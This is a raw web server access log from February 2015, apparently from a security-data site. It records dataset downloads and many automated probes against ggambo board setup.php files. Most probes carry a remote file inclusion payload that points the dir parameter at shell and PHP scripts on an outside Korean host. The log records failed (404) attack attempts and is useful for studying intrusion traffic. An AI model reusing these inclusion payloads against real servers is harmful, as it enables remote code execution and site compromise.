68.13.222.100 - - [10/Feb/2015:10:43:35 -0800] "GET /maccdc2012/signatures.log.gz HTTP/1.1" 200 604 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
68.13.222.100 - - [10/Feb/2015:10:43:36 -0800] "GET /maccdc2012/smtp.log.gz HTTP/1.1" 200 6907 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
68.13.222.100 - - [10/Feb/2015:10:43:29 -0800] "GET /maccdc2012/dns.log.gz HTTP/1.1" 200 6629419 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
68.13.222.100 - - [10/Feb/2015:10:43:37 -0800] "GET /maccdc2012/ssh.log.gz HTTP/1.1" 200 182516 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
68.13.222.100 - - [10/Feb/2015:10:43:40 -0800] "GET /maccdc2012/tunnel.log.gz HTTP/1.1" 200 5229 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
68.13.222.100 - - [10/Feb/2015:10:43:38 -0800] "GET /maccdc2012/ssl.log.gz HTTP/1.1" 200 1313674 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
68.13.222.100 - - [10/Feb/2015:10:43:41 -0800] "GET /maccdc2012/weird.log.gz HTTP/1.1" 200 1242776 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
68.13.222.100 - - [10/Feb/2015:10:43:33 -0800] "GET /maccdc2012/http.log.gz HTTP/1.1" 200 54258815 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
68.13.222.100 - - [10/Feb/2015:10:43:30 -0800] "GET /maccdc2012/files.log.gz HTTP/1.1" 200 51408672 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
104.130.161.117 - - [10/Feb/2015:10:44:29 -0800] "GET /honeypot////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 301 510 "-" "Tornado-Async-Client" 
104.130.161.117 - - [10/Feb/2015:10:44:29 -0800] "GET /honeypot////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.115 - - [10/Feb/2015:10:44:30 -0800] "GET /honeypot////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 301 510 "-" "Tornado-Async-Client" 
104.130.161.115 - - [10/Feb/2015:10:44:30 -0800] "GET /honeypot////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.116 - - [10/Feb/2015:10:44:48 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 301 491 "-" "Tornado-Async-Client" 
104.130.161.116 - - [10/Feb/2015:10:44:48 -0800] "GET /bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.113 - - [10/Feb/2015:10:44:51 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 301 491 "-" "Tornado-Async-Client" 
104.130.161.113 - - [10/Feb/2015:10:44:51 -0800] "GET /bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
1.224.163.80 - - [10/Feb/2015:10:47:16 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [10/Feb/2015:10:47:17 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [10/Feb/2015:10:47:18 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [10/Feb/2015:10:47:19 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
68.13.222.100 - - [10/Feb/2015:10:43:26 -0800] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 551041635 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
68.13.222.100 - - [10/Feb/2015:10:45:59 -0800] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 551041635 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
176.31.252.38 - - [10/Feb/2015:11:22:16 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0" 
176.31.252.38 - - [10/Feb/2015:11:22:17 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0" 
176.31.252.38 - - [10/Feb/2015:11:22:17 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0" 
176.31.252.38 - - [10/Feb/2015:11:22:18 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0" 
176.31.252.38 - - [10/Feb/2015:11:22:18 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0" 
176.31.252.38 - - [10/Feb/2015:11:22:18 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0" 
176.31.252.38 - - [10/Feb/2015:11:22:19 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0" 
176.31.252.38 - - [10/Feb/2015:11:22:19 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0" 
178.33.226.103 - - [10/Feb/2015:11:22:21 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
178.33.226.103 - - [10/Feb/2015:11:22:22 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
178.33.226.103 - - [10/Feb/2015:11:22:23 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
178.33.226.103 - - [10/Feb/2015:11:22:23 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
178.33.226.103 - - [10/Feb/2015:11:22:23 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
178.33.226.103 - - [10/Feb/2015:11:22:23 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
178.33.226.103 - - [10/Feb/2015:11:22:24 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
178.33.226.103 - - [10/Feb/2015:11:22:24 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
181.65.186.35 - - [10/Feb/2015:11:24:24 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:24:28 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:24:28 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:24:29 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:24:30 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:24:30 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:24:30 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:24:32 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
104.130.161.115 - - [10/Feb/2015:11:25:29 -0800] "GET /honeypot////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.115 - - [10/Feb/2015:11:25:29 -0800] "GET /honeypot////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.115 - - [10/Feb/2015:11:25:31 -0800] "GET /honeypot////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.115 - - [10/Feb/2015:11:25:31 -0800] "GET /honeypot////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.117 - - [10/Feb/2015:11:25:48 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 301 491 "-" "Tornado-Async-Client" 
104.130.161.117 - - [10/Feb/2015:11:25:48 -0800] "GET /bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.116 - - [10/Feb/2015:11:25:49 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 301 491 "-" "Tornado-Async-Client" 
104.130.161.116 - - [10/Feb/2015:11:25:49 -0800] "GET /bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
74.208.180.111 - - [10/Feb/2015:11:30:56 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:11:30:58 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:11:30:58 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
74.208.180.111 - - [10/Feb/2015:11:30:59 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
178.33.226.103 - - [10/Feb/2015:11:31:04 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
178.33.226.103 - - [10/Feb/2015:11:31:04 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
178.33.226.103 - - [10/Feb/2015:11:31:05 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
178.33.226.103 - - [10/Feb/2015:11:31:05 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
178.33.226.103 - - [10/Feb/2015:11:31:05 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
178.33.226.103 - - [10/Feb/2015:11:31:05 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
178.33.226.103 - - [10/Feb/2015:11:31:06 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
178.33.226.103 - - [10/Feb/2015:11:31:07 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
95.168.199.227 - - [10/Feb/2015:11:31:23 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Gigabot/3.0 (http://www.gigablast.com/spider.html)" 
95.168.199.227 - - [10/Feb/2015:11:31:24 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Gigabot/3.0 (http://www.gigablast.com/spider.html)" 
95.168.199.227 - - [10/Feb/2015:11:31:24 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Gigabot/3.0 (http://www.gigablast.com/spider.html)" 
95.168.199.227 - - [10/Feb/2015:11:31:24 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Gigabot/3.0 (http://www.gigablast.com/spider.html)" 
95.168.199.227 - - [10/Feb/2015:11:31:25 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Gigabot/3.0 (http://www.gigablast.com/spider.html)" 
95.168.199.227 - - [10/Feb/2015:11:31:26 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Gigabot/3.0 (http://www.gigablast.com/spider.html)" 
95.168.199.227 - - [10/Feb/2015:11:31:26 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Gigabot/3.0 (http://www.gigablast.com/spider.html)" 
95.168.199.227 - - [10/Feb/2015:11:31:27 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Gigabot/3.0 (http://www.gigablast.com/spider.html)" 
95.168.199.227 - - [10/Feb/2015:11:31:32 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
95.168.199.227 - - [10/Feb/2015:11:31:33 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
95.168.199.227 - - [10/Feb/2015:11:31:33 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
95.168.199.227 - - [10/Feb/2015:11:31:35 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
95.168.199.227 - - [10/Feb/2015:11:32:05 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
95.168.199.227 - - [10/Feb/2015:11:32:07 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
95.168.199.227 - - [10/Feb/2015:11:32:07 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
95.168.199.227 - - [10/Feb/2015:11:32:08 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
181.65.186.35 - - [10/Feb/2015:11:32:17 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:32:18 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:32:19 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:32:20 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
95.168.199.227 - - [10/Feb/2015:11:32:24 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
95.168.199.227 - - [10/Feb/2015:11:32:25 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
95.168.199.227 - - [10/Feb/2015:11:32:25 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
95.168.199.227 - - [10/Feb/2015:11:32:26 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.61 (Macintosh; I; PPC)" 
95.168.199.227 - - [10/Feb/2015:11:32:57 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
95.168.199.227 - - [10/Feb/2015:11:32:58 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
95.168.199.227 - - [10/Feb/2015:11:32:58 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
95.168.199.227 - - [10/Feb/2015:11:32:59 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
203.58.0.155 - - [10/Feb/2015:11:33:02 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
203.58.0.155 - - [10/Feb/2015:11:33:04 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
203.58.0.155 - - [10/Feb/2015:11:33:04 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
203.58.0.155 - - [10/Feb/2015:11:33:06 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
203.58.0.155 - - [10/Feb/2015:11:33:16 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
203.58.0.155 - - [10/Feb/2015:11:33:18 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
203.58.0.155 - - [10/Feb/2015:11:33:18 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
203.58.0.155 - - [10/Feb/2015:11:33:20 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
178.33.226.103 - - [10/Feb/2015:11:33:25 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
178.33.226.103 - - [10/Feb/2015:11:33:26 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
178.33.226.103 - - [10/Feb/2015:11:33:26 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
178.33.226.103 - - [10/Feb/2015:11:33:27 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
203.58.0.155 - - [10/Feb/2015:11:33:30 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
203.58.0.155 - - [10/Feb/2015:11:33:32 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
203.58.0.155 - - [10/Feb/2015:11:33:32 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
203.58.0.155 - - [10/Feb/2015:11:33:34 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
1.224.163.80 - - [10/Feb/2015:11:33:35 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:11:33:37 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:11:33:39 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [10/Feb/2015:11:33:41 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
